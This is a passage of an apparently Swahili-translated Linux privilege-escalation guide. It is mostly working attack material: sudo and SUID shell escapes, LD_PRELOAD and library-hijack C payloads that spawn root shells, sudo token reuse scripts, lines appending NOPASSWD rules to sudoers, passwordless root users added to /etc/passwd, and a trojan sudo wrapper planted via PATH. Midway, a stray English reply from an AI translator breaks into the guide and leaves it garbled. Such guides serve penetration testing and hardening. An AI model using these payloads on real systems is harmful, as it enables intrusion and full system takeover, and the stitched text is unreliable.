(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizo wazi

Daima angalia huduma za mtandao zinazoendesha kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuipata:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza kunusa trafiki. Ikiwa unaweza, unaweza kupata baadhi ya vitambulisho.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Kawaida

Angalia **wewe ni nani**, ni **privileges** zipi ulizonazo, ni **users** gani wako kwenye mifumo, ni nani wanaoweza **login** na ni nani wana **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux zilikuwa zimesababishwa na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kupandisha ruhusa. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Makundi

Angalia ikiwa wewe ni **mwanachama wa kundi fulani** ambalo linaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia kilicho ndani ya ubao wa kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Password Policy
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ikiwa unajua **nenosiri lolote** la mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hukujali kusababisha kelele nyingi na binaries za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kufanya brute-force kwa watumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameta `-a` pia itajaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa unagundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kuwa na uwezo wa kuongeza haki kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji mwingine (root ideally) na ambayo **haitakuwa inasomwa kutoka kwenye folda iliyoko kabla yako** katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo, au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **unexpected commands allow you to read and/or write files or even execute a command.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nywila.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye saraka ya `root` au kwa kuitisha `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Agizo hili linamruhusu mtumiaji **set an environment variable** wakati anatekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **vulnerable** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikiendeshwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Njia za bypassing za utekelezaji za Sudo

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi hata zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila command path

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kutaja path**: _hacker10 ALL= (root) less_ unaweza kui-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kutaja njia yake (hakikisha kila wakati ukitumia** _**strings**_ **kukagua yaliyomo ya binary ya SUID isiyo ya kawaida)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary na command path

Ikiwa **suid** binary **inatekeleza amri nyingine kwa kutaja njia yake**, basi, unaweza kujaribu **export a function** iitwayo kama amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ lazima ujaribu kuunda function na kuiexport:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha binary ya suid, kazi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa executables za **suid/sgid**, mfumo unaleta masharti fulani:

- Loader hainazingatii **LD_PRELOAD** kwa executables ambapo the real user ID (_ruid_) haifanani na the effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zilizoko tu katika njia za kawaida ambazo pia ni suid/sgid ndizo hupakiwa.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha tamko **env_keep+=LD_PRELOAD**. Usanidi huu unaruhusu variable ya mazingira **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezaji wa msimbo wowote kwa ruhusa zilizoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti **LD_LIBRARY_PATH** env variable, kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye **SUID permissions** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha ikiwa inapakia faili za **.so** kwa usahihi. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa exploitation.

Ili kufanyia exploit hii, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, iliyo na msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Kanuni hii, mara itakapokusanywa na kutekelezwa, inalenga kuinua idhini kwa kubadilisha ruhusa za faili na kutekeleza shell yenye idhini zilizoinuliwa.

Kusanya faili ya C iliyotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuchochea exploit, ikiruhusu uwezekano wa kupata udhibiti wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumepata SUID binary inayopakia library kutoka kwa folder ambako tunaweza kuandika, hebu tengeneza library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata hitilafu kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hiyo inamaanisha kwamba maktaba uliyotengeneza inahitaji kuwa na kazi inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya binaries za Unix ambazo mshambuliaji anaweza kuzitumia kuvuka vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza vigezo tu** katika amri.

Mradi unakusanya kazi halali za binaries za Unix ambazo zinaweza kutumiwa vibaya kutoroka shells zilizozuiliwa, kuongeza au kudumisha ruhusa zilizoinuliwa, kuhamisha faili, kuzalisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) ili kuangalia kama inapata jinsi ya exploit sheria yoyote ya sudo.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini sio password, unaweza kuongeza ruhusa kwa **kusubiri utekelezwaji wa amri ya sudo na kisha kuiba tokeni ya kikao**.

Requirements to escalate privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" amekuwa **ametumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default huo ndio muda wa tokeni ya sudo unaoturuhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kuhariri `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (hautapata root shell moja kwa moja, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inayomilikiwa na root na yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Exploit ya tatu** (`exploit_v3.sh`) **itaunda sudoers file** ambayo inafanya **sudo tokens kuwa za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **uruhusa wa kuandika** kwenye folda au kwenye yoyote ya faili zilizotengenezwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku**unda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika tena faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nywila kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizomo ndani ya `/etc/sudoers.d` zinaweka ni nani anaweza kutumia `sudo` na jinsi. Hizi faili **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha ruhusa**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida anaunganisha kwenye mashine na anatumia `sudo`** kupandisha ruhusa na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda sudo executable mpya** ambayo itatekeleza code yako kama root na kisha itatekeleza amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati mtumiaji anatekeleza sudo, sudo executable yako itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kuhariri faili nyingine ili kuongeza path mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

The file `/etc/ld.so.conf` indicates **ambapo faili za usanidi zinazoingizwa zinatoka**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **zinaelekeza kwenye folda nyingine** ambapo **maktaba** zitatafutwa. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Hii ina maana kwamba mfumo utafuta maktaba ndani ya `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **jinsi ya kutumia kosa hili la usanidi** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/`, itatumiwa na programu mahali hapo kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba haribifu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **sehemu ndogo ya root privileges zinazopatikana kwa mchakato**. Hii kwa ufanisi inagawa root **privileges kuwa vitengo vidogo na vinavyojitofautisha**. Kila kimoja cha vitengo hivi kinaweza kisha kupewa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya privileges inapunguzwa, ikipunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu capabilities na jinsi ya kuvitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za Katalogi

Katika katalogi, the **bit for "execute"** inaashiria kwamba mtumiaji anayehusika anaweza "**cd**" kwenye folda.\
The **"read"** bit inaashiria mtumiaji anaweza **kuorodhesha** **files**, na **"write"** bit inaashiria mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinaonyesha safu ya pili ya ruhusa za hiari, zenye uwezo wa **kuzipita ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti wa upatikanaji wa faili au katalogi kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha undani kinahakikisha usimamizi sahihi zaidi wa upatikanaji. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpe** mtumiaji "kali" ruhusa za "read" na "write" kwa faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACL maalum kutoka kwa mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session ya mtumiaji tofauti (**root**).\
Katika **matoleo ya hivi karibuni** utakuwa na uwezo wa **connect** kwa screen sessions tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo na **old tmux versions**. Sikuweza hijack tmux (v2.1) session iliyoundwa na root kama mtumiaji asiye na vibali.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vinavyotengenezwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, n.k.) kati ya Septemba 2006 na Mei 13th, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii inatokea wakati wa kuunda ssh key mpya kwenye OS hizo, kwani **tu mabadiliko 32,768 yalikuwa yanwezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ikiwa una ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaelezea kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaelezea kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, inaelezea kama server inaruhusu login kwa akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaelezea kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia tu kwa private key
- `forced-commands-only`: Root anaweza kuingia tu kwa private key na ikiwa chaguo za commands zimeainishwa
- `no`: hapana

### AuthorizedKeysFile

Inaelezea faili ambazo zina public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kujumuisha tokens kama `%h`, ambazo zitabadilishwa na directory ya nyumbani. **Unaweza kutaja absolute paths** (zinazoanza na `/`) au **relative paths kutoka kwa home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** located in your **initial host**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohama kwenda mashine tofauti, host hiyo itakuwa na uwezo wa kupata keys (ambayo ni suala la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** hizi **options** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (default ni allow).

Ikiwa utagundua kwamba Forward Agent imesanidiwa katika mazingira soma ukurasa ufuatao kwa sababu **utaweza kuuitumia vibaya ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zenye Kuvutia

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts ambazo zinaendeshwa wakati mtumiaji anapoendesha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote yao unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa skripti ya profile isiyo ya kawaida inapatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zina jina tofauti au kunaweza kuwa na chelezo. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia ikiwa unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au faili sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza password kwa mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md — please paste the file content you want translated.

Also clarify what you mean by "Then add the user `hacker` and add the generated password.":

- Do you want me to modify the translated README to include instructions/commands to create a local user named `hacker` and show a generated password? (I can generate a secure password and add the command snippet.)
- Or do you want me to actually create the user on your machine? (I can't perform actions on your system; I can only provide the exact commands to run.)

Tell me which you prefer and paste the README content to translate. If you want a generated password now, tell me the desired length and allowed character classes (lower/upper/digits/symbols) and I will include it.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa kuigiza bila nenosiri.\
ONYO: huenda ukapunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye baadhi ya **faili za usanidi za huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **modify the Tomcat service configuration file inside /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara inayofuata tomcat itakapowashwa.

### Kagua Mafolda

Folda zifuatazo zinaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hautaweza kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za mwisho
```bash
